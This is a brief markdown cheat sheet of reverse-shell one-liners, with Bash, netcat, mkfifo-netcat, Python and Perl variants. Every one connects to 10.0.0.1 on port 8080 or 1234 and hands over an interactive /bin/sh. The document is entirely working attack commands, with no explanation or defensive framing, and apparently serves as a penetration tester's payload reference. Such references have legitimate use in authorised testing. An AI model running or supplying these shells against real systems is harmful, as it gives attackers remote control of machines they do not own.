# ReverseShell

## Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Netcat

```bash
nc -e /bin/sh 10.0.0.1 1234
nc.traditional -e /bin/sh 10.0.0.1 1234
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

## Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");};'
```
